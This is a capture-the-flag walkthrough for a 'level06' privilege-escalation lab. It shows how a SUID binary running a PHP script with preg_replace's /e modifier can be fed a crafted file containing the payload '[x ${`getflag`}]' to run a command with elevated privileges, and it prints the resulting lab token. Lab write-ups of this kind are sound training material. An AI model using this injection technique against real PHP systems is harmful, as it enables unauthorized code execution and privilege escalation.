### Solution

1. **List files and check permissions**

	```bash
	ls -l
	```

	You will see the SUID binary owned by `flag06`:

	```
	-rwsr-x--- 1 flag06 level06 7503 Aug 30  2015 level06
	-rwxr-x--- 1 flag06 level06  356 Mar  5  2016 level06.php
	```

	The binary `level06` is **SUID**, meaning it executes with `flag06`'s privileges.

2. **Analyze `level06.php`:**

	The PHP script reads the contents of the input file, then runs a vulnerable `preg_replace` with the `/e` modifier that evaluates the input as PHP code.

	This allows **remote code execution** by passing specially crafted input files.

3. **Create a malicious payload to execute `getflag`:**

	Create a file `/tmp/flag06.txt` with the following content:

	```bash
	echo '[x ${`getflag`}]' >/tmp/flag06.txt
	```

	This payload exploits the `/e` modifier to execute the `getflag` command.

4. **Run the SUID binary with the malicious payload:**

	```bash
	./level06 /tmp/flag06.txt
	```

	The binary will:

	* Run the PHP script with your payload
	* Execute the `getflag` command with `flag06` privileges
	* Print the flag to stdout

	Output:

	```
	PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
	 in /home/user/level06/level06.php(4) : regexp code on line 1
	```

	You’ve successfully executed `getflag` with `flag06`’s privileges.
